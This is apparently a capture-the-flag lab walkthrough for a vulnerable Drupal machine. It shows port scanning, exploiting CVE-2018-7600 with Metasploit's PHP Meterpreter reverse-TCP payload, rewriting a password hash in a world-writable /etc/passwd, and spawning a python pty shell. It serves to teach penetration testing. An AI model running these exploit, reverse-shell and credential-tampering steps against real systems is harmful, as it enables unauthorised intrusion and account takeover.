@@ -1,1 +1,157 @@
-.
+Hello, welcome to the Drupal's Drag Race Walkthrough!
+
+So, what is Drupal?
+
+Drupal is a free and open-source content management framework (CMS) written in PHP, and it provides the back-end for a lot of large websites: BBC, USA Today, Huffington Post, and the Boston Globe. However, as with anything- improper implementation and lack of applying security patches can make Drupal extremely vulnerable.
+
+ENUMERATION & RECONAISSANCE
+
+Once we've let our Virtual Machine spin up, we'll know our IP Address, lets start out by scanning it:
+
+The scan shows us that there are two key ports open:
+
+    Port 22 – Used for SSH
+    Port 80 – Used to serve a web application
+
+Let’s start by running an Nmap full port scan on the target machine to get the list of open ports and services available on the target machine.
+
+Command Used:  << nmap [IP] –Pn –p- >>
+
+Explanation:
+
+    We have used -p- switch for full port scanning
+    We have used -Pn switch for No Ping Scan
+
+Then, we can see that there are a few open ports on the target machine. So let’s start with the HTTP port. When we open it in the browser, we find that there is an application running on the target machine, this gives us the name of the website. By scrolling down to the bottom, we can see a typical marker of what CMS is used
+
+By doing some research (Google is your friend!) we can work out that the /core/ directory is left unprotected by default and contains the CHANGELOG.txt to narrow down the exact version of the CMS that is running.
+
+VULNERABILITY ASSESSMENT
+
+Now we know what version of the CMS is running, lets research and apply a CVE to use against the target! CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws.
+
+When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.
+
+Good resources to use for this are:
+
+Online CVE Databases:
+
+    https://www.cvedetails.com/
+    https://cve.mitre.org/
+    https://nvd.nist.gov/vuln/search
+
+There are also tools that will automatically search CVE databases for you, such as Searchsploit.
+
+By looking up our version of Drupal on https://www.cvedetails.com/ we come across this page:
+
+https://www.cvedetails.com/cve/CVE-2018-7600/
+
+This details our vulnerabilty and exploit payload.
+
+EXPLOIT
+
+Metasploit is a penetration testing framework that makes hacking simple. It's an essential tool for many attackers and defenders. Point Metasploit at your target, pick an exploit, what payload to drop, and hit Enter.
+
+We're going to be using Metasploit's PHP Meterpreter to gain shell access to the compromised system, because we know that Drupal is both written in, and uses PHP to serve websites. 
+
+Command <<msfconsole >>
+
+We have started Metasploit by running the msfconsole command. It starts with very nice graphics. After this, I started the search for Drupalgeddon with the help of the search command.
+
+Command
+
+    << use exploit/unix/webapp/Drupal_drupalgeddon2 >>
+    << show options >>
+
+We have set up the exploit by using the use command and run the show options command to configure the required parameter into the exploit. So let’s configure the required exploit parameters with the payload.
+
+Command
+
+    << set rhost IP >>
+    << set payload php/meterpreter/reverse_tcp >>
+    << set lhost LOCAL IP >>
+    << set lport 4444 >>
+    << show options >>
+
+We have set up the required parameters and the payload. It’s the time to run the exploit.
+
+USING A METERPRETER SHELL
+
+If your Meterpreter returns with a session, Congratulations!
+
+You've successfully exploited the target machine, now it's time to see how we can further exploit this machine and escalate our privileges from a limited user.
+
+We can get the OS version and other systems with
+
+Command 
+
+     << sysinfo >>
+     
+Typing "shell" to get a shell allows us to see that we have received the shell access of the www-data user, which is a limited user. 
+
+EXPLOITING POORLY CONFIGURED FILE PERMISSIONS
+
+We already know that we have received the shell access of the www-data user, which is a limited user. In order to get the user and root flags, we first need to access a user with permissions to read those files.A good way to do this is to check for vulnerable file permissions.
+
+In your shell prompt, we can search for files that anybody has the permission to read, write and execute by typing:
+
+find / -maxdepth 2 -type f -perm 777
+
+This command searches the bottom two levels of the filesystem for files that have a permission  of "777" which corresponds to the following 3 permissions defined for all the 3 owners discussed above.
+
+    Read: This permission give you the authority to open and read a file. Read permission on a directory gives you the ability to lists its content.
+    Write: The write permission gives you the authority to modify the contents of a file. The write permission on a directory gives you the authority to add, remove and rename files stored in the directory. Consider a scenario where you have to write permission on file but do not have write permission on the directory where the file is stored. You will be able to modify the file contents. But you will not be able to rename, move or remove the file from the directory.
+    Execute: In Windows, an executable program usually has an extension ".exe" and which you can easily run. In Unix/Linux, you cannot run a program unless the execute permission is set. If the execute permission is not set, you might still be able to see/modify the program code(provided read & write permissions are set), but not run it.
+
+Essentially, 777 means that every user has the ability to read, write AND execute the file. System files with misconfigured permissions are a massive vulnerability- as we'll explore.
+
+It is extremely unusual that /etc/passwd will have these permissions, as it allows any user to read and write to the password file. We can use "cat" to display the contents of this.
+
+We're particularly interested in the user "mintybox", the characters after the first colon are the user's hashed password. We have the ability to write to the file. So lets change that user's password.
+
+We can generate the password by using the openssl package. The command for the password generation is:
+
+Command
+
+    << openssl passwd -1 -salt yournewpassword yournewpassword >>
+
+Using the word "default" as our new password, what is the password hash generated?
+
+Exit your shell and return to the meterpreter prompt by typing "exit"
+
+Now use the "edit /etc/passwd" command to edit the /etc/passwd file with your default terminal text editor (usually nano or vim) from the meterpreter prompt.
+
+Replace the previous password hash with our new one to set mintybox's password to "default".
+
+UPGRADING THE SHELL
+
+Those of you who have Linux experience might have noticed that our shell doesn't have a bash prompt, and that if we try and use "su" to log in as mintybox, we get told it "must be run from a terminal". This is because we don't have a full terminal- we just have a simple shell.
+
+Besides not correctly handling some commands, these "simple" shells have other shortcomings as well:
+
+    Some commands, like su and ssh require a proper terminal to run
+    STDERR usually isn’t displayed
+    Can’t properly use text editors like vim
+    No tab-complete
+    No up arrow history
+    No job control
+
+There are many ways to upgrade our shell to a fully interactive one, there are some good resources on that topic here:
+
+    Pentest Monkey - Post Exploitation Without a TTY
+    Phineas Fisher Hacks Catalan Police Union Website
+    Phineas Fisher - Hackingteam Writeup
+
+However today we're going to use a classic, using the python "pty" module to spawn a psuedo-terminal that can fool commands like su into thinking they are being executed in a proper terminal. To upgrade a dumb shell, simply run the following command:
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+This will let you run su for example in addition to giving you a nicer prompt.
+
+Now use the "su" command and our previous credentials to login as mintybox
+
+THE FINAL HURDLE
+
+List the contents of the user's home directory, what is the user flag?
+
+HINT: Use "Sudo" exploits to access the root commands. 
